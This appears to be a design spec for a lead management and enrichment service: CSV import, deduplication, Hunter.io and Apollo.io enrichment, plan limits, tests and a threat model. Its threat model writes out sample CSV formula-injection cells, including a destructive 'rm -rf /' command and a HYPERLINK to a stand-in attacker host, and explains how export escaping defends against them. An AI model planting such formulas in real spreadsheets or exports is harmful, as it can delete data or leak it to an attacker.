# Lead Management & Enrichment — Design Spec

**Date:** 2026-05-18  
**Status:** Draft  
**Priority:** P0 — Core Platform  
**Scope:** Spec 03 — Lead Management & Enrichment (lead-service)

---

## Problem Statement

Outreach is only as good as the data. RevLooper users import leads from spreadsheets, ad platforms, and manual entry — but raw data is dirty: duplicate emails, invalid addresses, missing company context. Sending to bad data burns domain reputation (the single most irreversible failure mode for email outreach).

**Evidence:**
- Industry average: 20-30% of imported CSV leads have invalid/duplicate emails
- A single 10%+ bounce rate can trigger ESP blacklisting — game over for the workspace
- Apollo.io enrichment provides title + company size + LinkedIn URL that personalizes copy 3x more effectively than first name alone

**Who has this problem:** Every workspace that imports leads. Pain is worst for users migrating from spreadsheets (majority of SEA SMB users).

**Current state:** No lead management system exists. This is a greenfield implementation.

---

## Goals

1. Lead import is < 2 minutes for 1,000 rows (CSV + mapping + dedup + status feedback)
2. Email verification (Hunter.io) runs automatically on import; invalid emails flagged before any send
3. Apollo.io enrichment fills company/title context on demand + auto for inbound captured leads
4. Dedup prevents double-outreach to the same contact within a workspace
5. Lead detail page gives a complete activity timeline (all touches: emails sent/opened/clicked, replies, meetings)

**Non-Goals:**
- Cross-workspace lead sharing
- Real-time LinkedIn scraping (legal risk — separate spec 10)
- AI-powered lead scoring (separate spec in Track D)
- Global suppression across workspaces

---

## Architecture

**Owning service:** `lead-service`

```
CSV upload (async job)          Manual create / API
       │                               │
       ▼                               ▼
[lead-service]  ◄── POST /v1/leads ───┘
  ├── Validate + dedup
  ├── Insert leads batch
  ├── Enqueue enrichment jobs (Cloud Tasks)
  └── Outbox events: lead.created (×N)

[enrichment-worker — Cloud Tasks handler]
  ├── Hunter.io: verify email → update enrichment_status
  ├── Apollo.io: enrich company/title (deduct credits first)
  └── Outbox: lead.enrichment.completed

[billing-service]  ◄── deduct_credits (Apollo: 3/lead)
```

### Service Boundary

- `lead-service` owns all lead persistence
- Portal and internal callers talk to it over HTTP only
- No other service reads lead tables directly
- `workspace_id` required on every workspace-scoped route

---

## Data Model

### Core Tables

#### `leads`

Source of truth for all lead data:

```sql
CREATE TABLE leads (
  id                  UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  workspace_id        UUID NOT NULL,
  email               TEXT NOT NULL,
  first_name          TEXT,
  last_name           TEXT,
  phone               TEXT,
  company             TEXT,
  title               TEXT,
  linkedin_url        TEXT,
  industry            TEXT,
  company_size        TEXT,              -- '1-10'|'11-50'|'51-200'|'201-500'|'501+'
  website             TEXT,
  city                TEXT,
  country             TEXT,
  timezone            TEXT,
  notes               TEXT,
  -- Status
  status              TEXT NOT NULL DEFAULT 'active',   -- 'active'|'unsubscribed'|'bounced'|'invalid'|'deleted'
  enrichment_status   TEXT NOT NULL DEFAULT 'unverified', -- 'unverified'|'verified'|'enriched'|'invalid'|'risky'
  -- Source attribution
  source_type         TEXT,              -- 'csv'|'manual'|'form'|'facebook_lead_ads'|'google_ads'|'zalo'|'tiktok'|'api'|'comment_capture'
  source_id           TEXT,              -- form_id or provider submission ID
  source_campaign_id  UUID,              -- soft FK to campaigns
  source_form_id      UUID,              -- soft FK to campaign_forms
  -- Scoring (spec 09)
  score               INTEGER NOT NULL DEFAULT 0,
  score_updated_at    TIMESTAMPTZ,
  -- Meta
  custom_fields       JSONB NOT NULL DEFAULT '{}',
  import_batch_id     UUID,              -- groups CSV import
  merged_from_id      UUID,              -- if dedup merged
  deleted_at          TIMESTAMPTZ,
  created_at          TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at          TIMESTAMPTZ NOT NULL DEFAULT now()
);

-- Unique per workspace
CREATE UNIQUE INDEX idx_leads_workspace_email
  ON leads (workspace_id, email) WHERE deleted_at IS NULL;

CREATE INDEX idx_leads_workspace_status
  ON leads (workspace_id, status, created_at DESC);

CREATE INDEX idx_leads_workspace_enrichment
  ON leads (workspace_id, enrichment_status);

CREATE INDEX idx_leads_workspace_score
  ON leads (workspace_id, score DESC) WHERE deleted_at IS NULL;

-- Full-text search
CREATE INDEX idx_leads_fts ON leads
  USING gin(to_tsvector('english', coalesce(first_name,'') || ' ' || coalesce(last_name,'') || ' ' || coalesce(company,'') || ' ' || email));
```

#### `lead_activities`

Append-only activity timeline:

```sql
CREATE TABLE lead_activities (
  id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  workspace_id    UUID NOT NULL,
  lead_id         UUID NOT NULL REFERENCES leads(id) ON DELETE CASCADE,
  activity_type   TEXT NOT NULL,   -- 'email_sent'|'email_opened'|'email_clicked'|'replied'|'meeting_booked'|'note'|'status_changed'|'enriched'
  metadata        JSONB NOT NULL DEFAULT '{}',
  actor_user_id   UUID,            -- auth.users.id or null (system)
  created_at      TIMESTAMPTZ NOT NULL DEFAULT now()
);

CREATE INDEX idx_lead_activities_lead ON lead_activities(lead_id, created_at DESC);
```

#### `lead_tags`

Workspace-scoped tag catalog:

```sql
CREATE TABLE lead_tags (
  id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  workspace_id    UUID NOT NULL,
  name            TEXT NOT NULL,
  color           TEXT NOT NULL DEFAULT '#6B7280',
  created_at      TIMESTAMPTZ NOT NULL DEFAULT now(),
  UNIQUE (workspace_id, name)
);
```

#### `lead_tag_assignments`

Many-to-many lead-tag relationship:

```sql
CREATE TABLE lead_tag_assignments (
  lead_id         UUID NOT NULL REFERENCES leads(id) ON DELETE CASCADE,
  tag_id          UUID NOT NULL REFERENCES lead_tags(id) ON DELETE CASCADE,
  PRIMARY KEY (lead_id, tag_id)
);
```

#### `enrichment_jobs`

Enrichment job tracking:

```sql
CREATE TABLE enrichment_jobs (
  id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  workspace_id    UUID NOT NULL,
  lead_id         UUID NOT NULL REFERENCES leads(id),
  provider        TEXT NOT NULL,   -- 'hunter'|'apollo'
  status          TEXT NOT NULL DEFAULT 'queued',  -- 'queued'|'running'|'done'|'failed'
  result          JSONB,
  error_message   TEXT,
  attempts        INTEGER NOT NULL DEFAULT 0,
  credits_used    INTEGER NOT NULL DEFAULT 0,
  created_at      TIMESTAMPTZ NOT NULL DEFAULT now(),
  completed_at    TIMESTAMPTZ
);

CREATE INDEX idx_enrichment_jobs_lead ON enrichment_jobs(lead_id);
```

### Migration

`alembic/versions/2026_05_05_003_create_leads_enrichment_tables.py`

### RLS

Standard workspace RLS on `leads`, `lead_activities`, `lead_tags`, `lead_tag_assignments`.

---

## API Contract

| Method | Path | Description |
|---|---|---|
| `POST` | `/v1/leads` | Create single lead |
| `GET` | `/v1/leads` | List leads (paginated, filterable, sortable) |
| `GET` | `/v1/leads/{id}` | Lead detail |
| `PATCH` | `/v1/leads/{id}` | Update lead fields |
| `DELETE` | `/v1/leads/{id}` | Soft-delete |
| `POST` | `/v1/leads/import` | Start CSV import (returns job_id) |
| `GET` | `/v1/leads/import/{job_id}` | Import status |
| `GET` | `/v1/leads/import/{job_id}/errors` | Download error rows |
| `POST` | `/v1/leads/bulk` | Bulk actions (tag/delete/export) |
| `POST` | `/v1/leads/{id}/enrich` | Trigger Apollo enrich (requires credits) |
| `POST` | `/v1/leads/bulk-enrich` | Bulk Apollo enrich (preview + confirm) |

### List Query Parameters

`search` (FTS), `status`, `enrichment_status`, `tag_ids[]`, `source_type`, `created_after`, `sort` (`score`|`created_at`|`name`), `limit`, `cursor`

---

## Core Flows

### CSV Import Pipeline

```
1. Validate file: MIME type, size ≤25MB, ≤50k rows
2. Parse headers → column mapping UI response
3. User maps columns → POST /v1/leads/import { column_map }
4. Cloud Tasks job:
   a. Read CSV in chunks of 500
   b. Per row: validate email format → dedup check → upsert
   c. Track error rows → write to R2 (error CSV)
   d. Update job progress (% complete)
   e. After all rows: enqueue Hunter verify jobs
5. Return: { imported, duplicates_skipped, errors, error_file_url }
```

**Performance target:** 1,000 rows < 30s p95

**Error handling:**
- Partial success allowed: good rows imported, error CSV downloadable
- Malicious file rejected: validate MIME type, extension, magic bytes
- Size limit: 25MB max, 50k rows max

### Enrichment Waterfall

```
Lead created (any source)
  ├─► Hunter.io verify (free, always runs)
  │     → status: 'verified' | 'invalid' | 'risky'
  │
  └─► Apollo.io enrich (3 credits, on-demand or Pro+ auto)
        → fill: title, company_size, industry, linkedin_url, website
        → status: 'enriched'
```

**Credit gate:** Apollo enrichment calls `billing-service POST /v1/billing/credits/deduct` BEFORE calling Apollo API. If insufficient credits, return 402 and do not call Apollo.

**Retry logic:** Provider timeout → retry up to 3 times with exponential backoff.

### Dedup Engine

**Exact email match within workspace:**
- Same email + same workspace = duplicate
- Same email + different workspace = not duplicate
- Concurrent imports protected by SELECT FOR UPDATE on workspace plan record

**Fuzzy dedup (v2):** Same person, different email domain — deferred to v2 with "possible duplicates" suggestion UX.

### Free Plan Limit Enforcement

**Limit:** 100 leads per workspace on Free plan

**Enforcement:**
- Limit check inside DB transaction with SELECT FOR UPDATE on workspace plan record
- Enforced server-side on every write path (create + import)
- 101st lead import blocked with 402 + upgrade CTA
- Concurrent import race condition prevented by transaction lock

---

## Event / Outbox Design

| Event | Producer | Subscribers | Payload |
|---|---|---|---|
| `lead.created` | lead-service | analytics-service, outreach-service (suppression check) | `{ workspace_id, lead_id, source_type }` |
| `lead.enrichment.completed` | lead-service | analytics-service | `{ workspace_id, lead_id, provider, enrichment_status }` |
| `lead.status.changed` | lead-service | outreach-service (if bounced → suppression) | `{ workspace_id, lead_id, old_status, new_status }` |
| `lead.bulk.imported` | lead-service | analytics-service | `{ workspace_id, batch_id, imported_count }` |

---

## Scale Design

| Concern | Plan |
|---|---|
| 50k-row CSV import | Cloud Tasks chunked 500/batch; p95 <30s |
| Lead list (100k/workspace) | Cursor pagination; index on `(workspace_id, created_at DESC)` |
| FTS search | GIN index on tsvector; pg_trgm extension for typo-tolerance v2 |
| Enrichment concurrency | Cloud Tasks rate-limited 10/sec/workspace → respects Hunter/Apollo quotas |
| 100 workspaces × 10M total leads | partition by `workspace_id` in v2 if needed; fine for MVP |

---

## Testing Strategy

### Test Pyramid

```
         /\          E2E (~12 scenarios, Playwright)
        /  \         ── Lead import, enrichment, bulk ops
       /----\
      / Integ \      Integration (~50 tests)
     /  tests  \     ── Import pipeline, Hunter/Apollo clients, dedup, bulk
    /------------\
   /  Unit tests  \  Unit (~40 tests)
  /________________\ ── CSV parsing, dedup logic, enrichment state machine, limit enforcement
```

### Critical Test Cases

**Unit tests:**
- CSV formula injection sanitized on export
- Email normalization lowercases
- Dedup exact email match detected within workspace
- Dedup different workspace not duplicate
- Enrichment state machine transitions
- Free plan limit 100 enforced
- Bulk delete requires confirm flag

**Integration tests:**
- CSV import 1,000 rows in under 30s (performance gate)
- CSV import partial success (30% invalid rows → good rows imported; error CSV URL returned)
- Malicious file upload rejected (executable with .csv extension → 415)
- File over 25MB rejected (413)
- Hunter verify sets verified/invalid status
- Apollo enrich deducts 3 credits BEFORE API call
- Apollo enrich fails with zero credits (402)
- Concurrent import does not exceed free plan limit (SELECT FOR UPDATE)
- Cross-workspace lead access returns 403

**E2E tests (Playwright):**
- Manual lead create
- CSV import success (100 rows)
- CSV import with errors (10 bad rows → 90 imported → error CSV downloadable)
- Duplicate handling (import existing email → "3 duplicates skipped" shown)
- Enrichment trigger (click Enrich → credits deducted → enriched status appears)
- Free plan limit (import 95 leads; try import 10 more → upgrade modal shown)
- Bulk tag (select 5 leads → apply tag "Hot" → all 5 show Hot tag)
- Lead detail timeline (activity timeline shows import + enrich events)
- Search and filter
- Bulk export
- Viewer cannot export
- Lead soft delete

### Coverage Gates

| Layer | Gate | Enforcement |
|---|---|---|
| lead-service unit + integration | 90% | `pytest --cov --cov-fail-under=90` |
| Security tests | 100% must pass | CI gate |
| Frontend (Vitest) | 80% | `vitest --coverage` |
| E2E | All 12 scenarios green | CI playwright job |
| Import performance | 1k rows < 30s | Timed in CI integration test |

---

## Security Considerations

### Threat Model

#### T01 — CSV Formula Injection

**Attack:** Attacker uploads CSV with cells containing `=CMD("rm -rf /")` or `=HYPERLINK("http://evil.com/steal")`.

**Impact:** Code execution in victim's spreadsheet app when they download the export CSV.

**Mitigation:**
- Any CSV field starting with `=`, `+`, `-`, `@`, `\t`, `\r` is prefixed with `'` (apostrophe) on export
- On import: those characters are stripped/normalized (not executed)
- CSV library: use `csv.reader` (Python stdlib) — no formula evaluation

**Test:** `test_csv_export_sanitizes_formula_injection`

#### T02 — Malicious File Upload

**Attack:** User uploads a file that is not a CSV (e.g., executable disguised with `.csv` extension).

**Impact:** Code execution on server; storage of malicious files.

**Mitigation:**
- Validate MIME type (`text/csv`, `application/vnd.ms-excel`, `text/plain`)
- Validate file extension (`.csv`, `.tsv`)
- Validate magic bytes (first 512 bytes — CSV should be printable UTF-8 text)
- Hard size limit: 25MB; reject at boundary
- File uploaded to Cloudflare R2, never executed on server — parsed in-process with streaming parser
- Virus scanning: Cloudflare R2 can integrate with ClamAV (v2 enhancement)

**Test:** `test_exe_disguised_as_csv_rejected`, `test_file_over_25mb_rejected`

#### T03 — PII Exposure / PDPA/GDPR Compliance

**Attack:** (Regulatory) Processing Vietnamese/Thai/Singapore citizen PII without consent.

**Impact:** PDPA/GDPR fines; reputational damage.

**Mitigation:**
- `consent_log` entry created when a workspace imports leads with consent_required_countries (VN/TH/SG)
- Export CSV includes only fields visible to the requesting user's role
- Viewer role cannot export leads
- Admin/Owner can configure data retention policy (auto-delete leads after N days of inactivity)
- PII fields (email, phone, linkedin_url) not logged in application logs

**Test:** `test_viewer_cannot_export_leads`, `test_pii_fields_not_in_application_logs`

#### T04 — Enrichment API Credential Exposure

**Attack:** Hunter.io and Apollo.io API keys exposed in logs, error messages, or API responses.

**Impact:** Attacker uses our API keys; credit exhaustion; billing fraud.

**Mitigation:**
- API keys fetched from GCP Secret Manager at service startup (not environment variables)
- Keys never logged (structlog redact: `hunter_api_key`, `apollo_api_key`)
- Error messages from enrichment providers do not echo raw API responses to the client
- Key rotation: documented runbook in implementation phases

**Test:** `test_enrichment_error_does_not_expose_api_key`

#### T05 — Bulk Delete Abuse

**Attack:** Admin-role attacker bulk-deletes entire lead database.

**Impact:** Irreversible data loss.

**Mitigation:**
- Bulk delete is soft-delete (sets `deleted_at`) — 30-day recovery window
- Bulk delete of >500 leads requires explicit confirmation flag (`confirm_delete: true`)
- Audit log entry includes count + actor + timestamp
- Hard delete requires owner role + 24-hour delay (scheduled job)

**Test:** `test_bulk_delete_without_confirm_returns_422`, `test_bulk_delete_creates_audit_log_entry`

#### T06 — Free Plan Limit Bypass

**Attack:** Client sends multiple concurrent import requests to race past the 100-lead limit.

**Impact:** Free users store unlimited leads without paying.

**Mitigation:**
- Limit check is inside a DB transaction with a SELECT FOR UPDATE on workspace plan record
- Limit enforced server-side on every write path (create + import)
- Limit check is tested with concurrent requests

**Test:** `test_concurrent_import_does_not_exceed_free_plan_limit`

### RevLooper Non-Negotiables Checklist

| Requirement | Status | Notes |
|---|---|---|
| workspace_id on every DB query | Required | Unique index on (workspace_id, email) |
| Credits before enrichment (Apollo) | Required | billing-service called BEFORE Apollo API |
| Secrets via GCP Secret Manager | Required | Hunter/Apollo keys |
| SEA consent (consent_log) | Required | VN/TH/SG workspaces |
| Transactional outbox | Required | lead.created, lead.enrichment.completed |
| Suppression check | Required | lead.created event triggers suppression check in outreach-service |

---

## Deployment & Configuration

### Environment Variables Required

- `HUNTER_API_KEY` — Hunter.io API key (from GCP Secret Manager)
- `APOLLO_API_KEY` — Apollo.io API key (from GCP Secret Manager)

### GCP Secret Manager Setup

**Staging:**
```bash
echo -n "hunter_key_..." | gcloud secrets create lead-service-hunter-key \
  --data-file=- --project=revlooper-staging

echo -n "apollo_key_..." | gcloud secrets create lead-service-apollo-key \
  --data-file=- --project=revlooper-staging
```

**Production:**
```bash
echo -n "hunter_key_..." | gcloud secrets create lead-service-hunter-key \
  --data-file=- --project=revlooper-prod

echo -n "apollo_key_..." | gcloud secrets create lead-service-apollo-key \
  --data-file=- --project=revlooper-prod
```

### Feature Flags

| Flag | Default | Purpose |
|---|---|---|
| `lead_enrichment_hunter_enabled` | true | Hunter email verify |
| `lead_enrichment_apollo_enabled` | true | Apollo enrichment |
| `lead_csv_import_enabled` | true | CSV import feature gate |
| `lead_auto_enrich_enabled` | false | Auto-enrich on inbound (Pro+ only) |

### Monitoring

| Signal | Alert threshold | Tool |
|---|---|---|
| CSV import job failure rate | > 5% | Cloud Tasks metric |
| Hunter verify success rate | < 90% | Enrichment jobs metric |
| Apollo enrich success rate | < 85% | Enrichment jobs metric |
| Lead list p99 latency (10k leads) | > 1s | Cloud Run metric |
| Free plan limit bypass attempts | Any > 0 | Security alert |

### Rollout Plan

**Phase 1 — Core Lead CRUD (Week 2-3, after spec 01):**
1. Alembic migration: all tables + indexes + RLS
2. Lead CRUD service layer + FastAPI router
3. Tag management API
4. Lead list: FTS, filters, cursor pagination
5. Lead activity timeline write + read
6. Outbox events
7. Free plan limit enforcement
8. Unit + integration tests, coverage ≥ 90%

**Exit gate:** Lead CRUD fully functional in staging; free plan limit race condition test passes.

**Phase 2 — CSV Import Pipeline (Week 3):**
1. CSV upload endpoint → R2 storage → Cloud Tasks import job
2. Column mapping API response
3. Import job: stream parse → validate → dedup → batch insert (500/batch)
4. Error CSV generation → R2 → pre-signed download URL
5. Import progress API
6. Post-import: enqueue Hunter verify jobs
7. Import tests: 1k rows < 30s, partial success, CSV injection, file validation

**Exit gate:** 50k-row CSV import completes < 30s; error CSV downloadable.

**Phase 3 — Enrichment Pipeline (Week 3-4):**
1. Hunter.io client + webhook result handler
2. Apollo.io client + credit deduction integration
3. Enrichment state machine transitions
4. Bulk enrich API: preview → confirm → enqueue jobs
5. Auto-enrichment for Pro+ workspaces
6. Enrichment tests: credits-before-Apollo, retry on timeout, partial success

**Exit gate:** Hunter verify + Apollo enrich working E2E; credits deducted before API call confirmed.

**Phase 4 — Frontend + Bulk Ops (Week 4):**
1. Lead list page (TanStack Query, infinite scroll, filters, sort)
2. Lead detail page (all fields editable, activity timeline)
3. CSV import modal (drag-and-drop upload + column mapping UI)
4. Enrichment status badge per lead
5. Bulk action toolbar (tag, delete, export)
6. Free plan limit banner + upgrade CTA
7. Frontend tests, E2E scenarios

---

## Out of Scope

The following are explicitly **not** included in this implementation:

1. **Lead scoring** — Separate spec 09
2. **LinkedIn enrichment / scraping** — Separate spec 10 (legal risk)
3. **AI-powered dedup** — Fuzzy matching v2 deferred
4. **Cross-workspace dedup** — Not needed for MVP
5. **Real-time LinkedIn scraping** — Legal risk, separate spec
6. **Global suppression across workspaces** — Not needed for MVP

---

## Success Criteria

**Acceptance Criteria:**
- CSV import: up to 50,000 rows; column mapping UI; required fields validated
- Import shows progress bar; partial success allowed (invalid rows skipped with download of error rows)
- Manual lead creation form (name, email, phone, company, title, linkedin_url, notes)
- Duplicate detection: same email within workspace → flag and let user choose merge/skip/overwrite
- Hunter.io email verify runs async after import; status: `unverified → verified | invalid | risky`
- Apollo.io enrichment runs on-demand (3 credits/lead shown before trigger) + bulk enrich with preview
- Auto-enrichment on inbound captured leads (Pro+ plan): Hunter verify → Apollo enrich pipeline
- Leads not enrollable in sequences if status = `invalid`
- Lead list: search by name/email/company; filter by status/tag/enrichment; sort by created_at/score
- Lead detail: full activity timeline; edit all fields; tag management; manual notes
- Bulk actions on lead list: tag, delete (soft), export CSV, add-to-campaign
- Free plan: 100 lead limit enforced server-side (import blocked at 100; clear CTA to upgrade)
- Source attribution fields on every lead: `source_type`, `source_id`, `source_campaign_id`, `source_form_id`

**Success Metrics:**

| Metric | Target | Where measured |
|---|---|---|
| Import p95 latency (1k rows) | < 30s | job duration metric |
| Post-import bounce rate at first send | < 3% (industry avg: 10%) | campaign analytics |
| Enrichment request success rate | ≥ 95% (Apollo/Hunter uptime) | provider health metric |
| Duplicate detection catch rate | ≥ 99% on same-email duplicates | test + prod sampling |
| Lead list page load (10k leads) | < 1s p95 | frontend perf trace |

---

## Implementation Checklist

- [ ] Alembic migration: `leads`, `lead_activities`, `lead_tags`, `lead_tag_assignments`, `enrichment_jobs` tables + indexes + RLS
- [ ] Lead CRUD service layer + FastAPI router (all standard endpoints)
- [ ] Tag management API
- [ ] Lead list: FTS search + filters + cursor pagination
- [ ] Lead activity timeline write + read
- [ ] CSV upload endpoint + Cloud Tasks import job
- [ ] Column mapping API
- [ ] Import job: stream parse → validate → dedup → batch insert (500/batch)
- [ ] Error CSV generation → R2 → pre-signed download URL
- [ ] Import progress API
- [ ] Hunter.io client (email verify API) + webhook result handler
- [ ] Apollo.io client (enrich endpoint) + credit deduction integration
- [ ] Enrichment state machine transitions
- [ ] Bulk enrich API: preview + confirm + enqueue jobs
- [ ] Auto-enrichment for Pro+ workspaces
- [ ] Bulk action API + frontend (tag, delete, export)
- [ ] Free plan limit enforcement middleware
- [ ] Lead list + detail frontend pages
- [ ] CSV import modal (drag-and-drop upload + column mapping UI)
- [ ] Enrichment status badge per lead
- [ ] Bulk action toolbar
- [ ] Free plan limit banner + upgrade CTA
- [ ] Outbox events: `lead.created`, `lead.enrichment.completed`, `lead.status.changed`, `lead.bulk.imported`
- [ ] Unit tests (coverage ≥ 90%)
- [ ] Integration tests (CSV import, enrichment, dedup, bulk ops)
- [ ] Security tests (100% pass rate)
- [ ] E2E tests (all 12 scenarios green)
- [ ] Monitoring alerts configured
- [ ] Secrets added to GCP Secret Manager (staging + prod)
- [ ] Deploy to staging and test
- [ ] Deploy to production

---

## CPO ↔ CTO Debate Summary

**Round 1 (gap: 2):**
- CPO 9: "CSV import and Hunter auto-verify must both land in Wave 1"
- CTO 7: "CSV 50k rows async is fine; concern is Hunter.io API rate limits hitting on bulk import day"

**Round 2 (converged, both 9):**
- Rate-limit Hunter at 10/sec/workspace via Cloud Tasks; acceptable 30s latency for 1k-lead import

**Final: 9/10.** Not 10: fuzzy dedup and per-workspace Hunter API key management are deferred to v2.
